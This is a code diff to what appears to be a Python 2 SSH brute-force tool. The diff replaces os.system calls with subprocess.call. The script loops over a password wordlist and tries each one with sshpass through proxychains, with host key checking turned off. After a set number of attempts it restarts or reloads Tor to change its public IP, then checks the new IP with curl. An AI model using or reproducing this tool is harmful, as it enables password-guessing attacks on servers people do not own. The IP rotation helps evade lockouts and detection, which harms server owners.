@@ -25,7 +25,7 @@ CONTACTS:
 	- neetx@protonmail.com
 """
 
-import os, sys, argparse, time
+import os, sys, argparse, time, subprocess
 from dependences import manage_dependences
 from validators import (
 	ipValidator,
@@ -120,25 +120,26 @@ def main():
 			f = open(wordlist)
 			c = 0
 
-			os.system('service tor restart')
+			subprocess.call(['service', 'tor', 'restart'])
 			print '[*] Public IP changed to:'
 			time.sleep(wait)
-			os.system('proxychains -q curl https://ipinfo.io/ip')
+			subprocess.call(['proxychains', '-q', 'curl', 'https://ipinfo.io/ip'])
 			print
 
 
 			for line in f:
 				if(c == attempts):
 					c = 0
-					os.system('service tor reload')
+					subprocess.call(['service', 'tor', 'reload'])
 					print '[*] Public IP changed to:'
 					time.sleep(wait)
-					os.system('proxychains -q curl https://ipinfo.io/ip')
+					subprocess.call(['proxychains', '-q', 'curl', 'https://ipinfo.io/ip'])
 					print
 
 				print 'We\' re trying with: ' + line
 				var = 'proxychains sshpass -p ' + line[:-1] + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
-				os.system(var)
+				var_list = var.split(' ')
+				subprocess.call(var_list)
 				c += 1
 
 	except (KeyboardInterrupt, SystemExit):
